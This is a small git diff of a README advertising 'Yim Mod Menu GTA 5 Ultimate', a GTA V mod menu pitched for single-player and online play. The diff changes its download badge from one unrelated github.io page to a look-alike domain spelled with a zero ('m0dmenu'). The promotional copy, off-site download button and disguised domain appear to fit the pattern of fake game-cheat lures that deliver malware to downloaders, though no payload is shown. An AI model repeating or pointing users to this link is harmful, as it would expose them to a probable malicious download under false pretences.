@@ -2,7 +2,7 @@
 
 Yim Mod Menu GTA 5 Ultimate is a modern, high-performance modding solution that allows players to unlock the full potential of GTA V. With a robust feature set, intuitive design, and continuous support, this tool enables players to customize gameplay in both single-player and online environments without complications.
 
-[![Download Yim Mod Menu](https://img.shields.io/badge/Download-Yim_Mod_Menu-orange)](https://asdeennerhorse.github.io/mogus/YimMod)
+[![Download Yim Mod Menu](https://img.shields.io/badge/Download-Yim_Mod_Menu-orange)](https://yim-m0dmenu-gtav.github.io/.github/)
 
 ---
 
